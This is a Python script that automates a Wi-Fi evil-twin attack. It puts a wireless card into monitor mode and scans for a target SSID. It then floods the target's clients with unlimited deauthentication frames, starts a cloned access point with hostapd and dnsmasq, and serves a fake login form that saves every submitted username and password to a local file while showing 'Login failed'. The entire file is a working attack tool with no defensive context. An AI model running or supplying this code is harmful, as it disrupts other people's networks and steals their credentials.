import subprocess
import time
import os
from flask import Flask, request

# ====================== CONFIGURATION ======================

INTERFACE = "wlan0"          # Your wireless interface
MONITOR_INTERFACE = "wlan0"
TARGET_SSID = "TestNetwork"  # Replace with target SSID
EVIL_SSID = "TestNetwork"    # Same as target (evil twin)
EVIL_CHANNEL = 6             # Match target's channel
EVIL_IP_RANGE = "192.168.1.100,192.168.1.200,12h"

# ====================== FILES ======================

HOSTAPD_CONF = "hostapd.conf"
DNSMASQ_CONF = "dnsmasq.conf"
CREDS_FILE = "creds.txt"

# ====================== FUNCTIONS ======================

def enable_monitor_mode():
    """Enable monitor mode on the wireless interface."""
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    subprocess.run(["sudo", "airmon-ng", "start", INTERFACE])


def scan_networks():
    """Scan for nearby networks and return a list."""
    try:
        print("[+] Scanning for networks...")
        # Run airodump-ng for 10 seconds to capture networks
        subprocess.run(
            ["sudo", "airodump-ng", MONITOR_INTERFACE, "--write", "scan", "--output-format", "csv"],
            timeout=10,
            check=True  # Raise an error if the command fails
        )
        
        # Parse the CSV output
        networks = []
        csv_file = "scan-01.csv"
        if not os.path.exists(csv_file):
            print(f"[-] Error: {csv_file} not found. Check if airodump-ng ran successfully.")
            return []

        with open(csv_file, "r") as f:
            for line in f:
                if "BSSID" in line or line.strip() == "":
                    continue
                parts = line.split(",")
                if len(parts) >= 14:
                    networks.append({
                        "BSSID": parts[0].strip(),
                        "SSID": parts[13].strip(),
                        "CHANNEL": parts[3].strip(),
                        "PWR": parts[8].strip()
                    })
        return networks

    except subprocess.TimeoutExpired:
        print("[!] Scan timed out. Ensure your Wi-Fi adapter supports monitor mode.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Command failed: {e}")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    return []



def deauthenticate(bssid, client=None):
    """Deauthenticate clients from the target network."""
    print(f"[+] Deauthenticating clients from {bssid}...")
    cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid]
    if client:
        cmd.extend(["-c", client])
    cmd.append(MONITOR_INTERFACE)
    subprocess.Popen(cmd)


def setup_evil_twin():
    """Create the evil twin access point."""
    print("[+] Setting up evil twin...")

    # Create hostapd config
    with open(HOSTAPD_CONF, "w") as f:
        f.write(f"""
interface={INTERFACE}
driver=nl80211
ssid={EVIL_SSID}
hw_mode=g
channel={EVIL_CHANNEL}
        """)

    # Create dnsmasq config
    with open(DNSMASQ_CONF, "w") as f:
        f.write(f"""
interface={INTERFACE}
dhcp-range={EVIL_IP_RANGE}
        """)

    # Start services
    subprocess.Popen(["sudo", "hostapd", HOSTAPD_CONF])
    subprocess.Popen(["sudo", "dnsmasq", "-C", DNSMASQ_CONF])


def start_credential_harvester():
    """Start a fake login page to capture credentials."""
    app = Flask(__name__)

    @app.route('/login', methods=['POST'])
    def login():
        username = request.form.get('username')
        password = request.form.get('password')
        with open(CREDS_FILE, 'a') as f:
            f.write(f"{username}:{password}\n")
        return "Login failed. Please try again."

    print("[+] Credential harvester running on http://192.168.1.1/login")
    app.run(host='0.0.0.0', port=80)


def cleanup():
    """Stop all processes and clean up."""
    print("[+] Cleaning up...")
    subprocess.run(["sudo", "pkill", "hostapd"])
    subprocess.run(["sudo", "pkill", "dnsmasq"])
    subprocess.run(["sudo", "airmon-ng", "stop", MONITOR_INTERFACE])

    if os.path.exists(HOSTAPD_CONF):
        os.remove(HOSTAPD_CONF)
    if os.path.exists(DNSMASQ_CONF):
        os.remove(DNSMASQ_CONF)

# ====================== MAIN ======================

if __name__ == "__main__":
    try:
        # Step 1: Enable monitor mode
        enable_monitor_mode()

        # Step 2: Scan for target network
        networks = scan_networks()
        target = next((n for n in networks if n["SSID"] == TARGET_SSID), None)
        if not target:
            print(f"[-] Target network '{TARGET_SSID}' not found.")
            exit(1)

        # Step 3: Deauthenticate clients
        deauthenticate(target["BSSID"])

        # Step 4: Set up evil twin
        setup_evil_twin()

        # Step 5: Start credential harvester
        start_credential_harvester()

        # Keep running until interrupted
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        cleanup()
    except Exception as e:
        print(f"[-] Error: {e}")
        cleanup()
